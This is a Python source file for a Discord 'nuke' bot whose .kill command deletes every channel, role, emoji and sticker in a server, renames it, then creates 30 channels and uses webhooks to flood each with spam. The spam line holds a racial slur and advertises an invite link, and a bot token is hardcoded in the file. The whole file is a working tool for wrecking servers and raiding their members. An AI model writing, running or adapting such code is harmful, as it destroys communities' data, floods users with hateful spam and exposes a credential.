import discord
from discord.ext import commands
import requests
import asyncio
import aiohttp
import json
import random
import aiohttp
import discord
from discord.ext import commands
import urllib.request
import json
import requests
import time
from discord import Embed
from flask import Flask, request, abort
from discord.ext import commands, tasks
import datetime
import concurrent.futures
import threading
import pyshorteners
import os
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='.', intents=intents)
bot.remove_command("help")
blacklist = 69
spam = f"@everyone @here Получите ядерное оружие!! негры   discord.gg/proofss"


@bot.event
async def on_ready():
    print(f'{bot.user.name}')

TOKEN = 'MTIxOTgwNDk2MTcwNjIxNzUxMg.Gl3W5M.FPnZ8Hi_XWFnG4RaDNLzT-WweEYaX06mFtwz80'
headers = {"Authorization": f"Bot {TOKEN}"} 
WEBHOOK_NAMES = ["Топк"]
CHANNEL_NAMES = ["Топк"]
invite = "https://discord.gg/proofss"   




@bot.command(name='kill', aliases=['nuke'])
@commands.cooldown(1, 1000, commands.BucketType.guild)
async def kill(ctx):
    try:
        guild = ctx.guild

        try:
            with open('topc.png', 'rb') as icon_file:
                await guild.edit(name='Topc', icon=icon_file.read())
        except Exception as icon_error:
            pass

 
        try:
            tasks = [delete_channel(channel) for channel in guild.channels]
            await asyncio.gather(*tasks)
        except Exception as delete_error:
            pass

        
        try:
            created_channels_with_webhooks = await create_channels_with_webhooks(guild)
            channels, webhooks = zip(*created_channels_with_webhooks)
        except Exception as create_error:
            channels, webhooks = [], []

   
        try:
            await asyncio.gather(*(send_messages_to_channel(channel, webhook) for channel, webhook in zip(channels, webhooks)))
        except Exception as send_error:
            pass

   
        try:
            await clean_guild_emojis(guild)
            await clean_guild_stickers(guild)
        except Exception as clean_error:
            pass

    
        try:
            for role in guild.roles:
                await role.delete()
        except Exception as role_error:
            pass

    except Exception as e:
        pass

async def delete_channel(channel):
    try:
        await channel.delete()
        await asyncio.sleep(1) 
    except Exception as delete_error:
        pass

async def create_channels_with_webhooks(guild):
    try:
        channels = [f'{random.choice(CHANNEL_NAMES)}' for i in range(1, 31)]
        created_channels_with_webhooks = await asyncio.gather(
            *(create_channel_with_webhook(guild, name) for name in channels)
        )

        return created_channels_with_webhooks
    except Exception:
        return []

async def create_channel_with_webhook(guild, name):
    try:
        channel = await guild.create_text_channel(name)
        webhook_name = random.choice(WEBHOOK_NAMES)
        webhook = await create_webhook(channel, webhook_name)
        return channel, webhook
    except Exception:
        return None

async def create_webhook(channel, name):
    try:
        headers = {"Authorization": f"Bot {TOKEN}"}
        async with aiohttp.ClientSession() as session:
            async with session.post(f"https://discord.com/api/v10/channels/{channel.id}/webhooks",
                                    json={"name": name}, headers=headers) as response:
                data = await response.json()
                if 'url' in data:
                    webhook = discord.Webhook.from_url(data['url'], session=session)
                    return webhook
                else:
                    return None
    except Exception:
        return None

async def send_messages_to_channel(channel, webhook):
    try:
        if webhook is None:
            return

        channel_id = channel.id

        async with aiohttp.ClientSession() as session:
            webhook_url = f"https://discord.com/api/webhooks/{webhook.id}/{webhook.token}"
            tasks = [send_webhook_message(session, webhook_url, {"content": f"{spam}"}) for _ in range(45)]

            for task in tasks:
                await asyncio.gather(task, asyncio.sleep(0.1))

    except Exception:
        pass

async def send_webhook_message(session, webhook_url, payload):
    try:
        headers = {'Content-Type': 'application/json', "Authorization": f"Bot {TOKEN}"}
        async with session.post(webhook_url, data=json.dumps(payload), headers=headers) as response:
            if response.status != 204:
                pass

    except Exception:
        pass

async def clean_guild_emojis(guild):
    try:
        for emoji in guild.emojis:
            await emoji.delete()
    except Exception:
        pass

async def clean_guild_stickers(guild):
    try:
        stickers = guild.stickers
        for sticker in stickers:
            await sticker.delete()
    except Exception:
        pass



bot.run(TOKEN)    